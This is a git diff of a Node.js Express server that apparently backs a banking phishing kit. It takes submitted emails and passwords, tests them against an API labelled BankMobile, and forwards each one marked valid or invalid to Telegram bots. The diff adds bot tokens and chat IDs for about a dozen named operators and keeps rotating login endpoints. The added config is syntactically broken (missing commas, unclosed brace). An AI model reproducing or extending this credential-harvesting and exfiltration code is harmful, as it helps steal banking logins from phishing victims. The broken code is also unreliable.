@@ -14,11 +14,7 @@ app.use(cors({ origin: '*' }));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ================================================
-// TELEGRAM BOT CONFIGURATION
-// ================================================
 
-// Map frontend IDs to bot tokens and chat IDs
 const BOT_CONFIGS = {
     'emmy': {
         token: process.env.BOT_TOKEN_1,
@@ -28,21 +24,52 @@ const BOT_CONFIGS = {
         token: process.env.BOT_TOKEN_2,
         chatId: process.env.CHAT_ID_2
     },
-    'user3': {
+    'black': {
         token: process.env.BOT_TOKEN_3,
         chatId: process.env.CHAT_ID_3
     }
+	'oju': {
+        token: process.env.BOT_TOKEN_4,
+        chatId: process.env.CHAT_ID_4
+		}
+	'bosun': {
+        token: process.env.BOT_TOKEN_5,
+        chatId: process.env.CHAT_ID_5
+		}
+	'chamber': {
+        token: process.env.BOT_TOKEN_6,
+        chatId: process.env.CHAT_ID_6
+		}
+	'hayzed': {
+        token: process.env.BOT_TOKEN_7,
+        chatId: process.env.CHAT_ID_7
+		}
+	'ysd': {
+        token: process.env.BOT_TOKEN_8,
+        chatId: process.env.CHAT_ID_8
+		}
+	'sula': {
+        token: process.env.BOT_TOKEN_9,
+        chatId: process.env.CHAT_ID_9
+		}
+	'jide': {
+        token: process.env.BOT_TOKEN_10,
+        chatId: process.env.CHAT_ID_10
+		}
+	'crip': {
+        token: process.env.BOT_TOKEN_11,
+        chatId: process.env.CHAT_ID_11
+		
+		
 };
 
-// Default config
+
 const DEFAULT_CONFIG = {
     token: process.env.DEFAULT_BOT_TOKEN,
     chatId: process.env.DEFAULT_CHAT_ID
 };
 
-// ================================================
-// SEND TO TELEGRAM
-// ================================================
+
 async function sendToTelegram(token, chatId, message) {
     if (!token || !chatId) {
         console.log('⚠️ Missing token or chat ID');
@@ -62,9 +89,6 @@ async function sendToTelegram(token, chatId, message) {
     }
 }
 
-// ================================================
-// AUTHENTICATE WITH BANKMOBILE
-// ================================================
 async function authenticateWithAPI(email, password) {
     try {
         console.log(`🌐 Sending login request for: ${email}`);
@@ -105,9 +129,7 @@ async function authenticateWithAPI(email, password) {
     }
 }
 
-// ================================================
-// FORMAT MESSAGE
-// ================================================
+
 function formatMessage(email, password, success, frontend) {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
     const statusText = success ? '✅ VALID' : '❌ INVALID';
@@ -123,9 +145,7 @@ function formatMessage(email, password, success, frontend) {
         `🕐 ${timestamp}`;
 }
 
-// ================================================
-// SHARED AUTH HANDLER
-// ================================================
+
 async function handleAuth(req, res) {
     const { email, password, frontend } = req.body;
     
@@ -151,9 +171,6 @@ async function handleAuth(req, res) {
     });
 }
 
-// ================================================
-// ALL AUTH ENDPOINTS - SUPPORTS ROTATION
-// ================================================
 app.post('/authenticate', handleAuth);
 app.post('/auth', handleAuth);
 app.post('/verify', handleAuth);
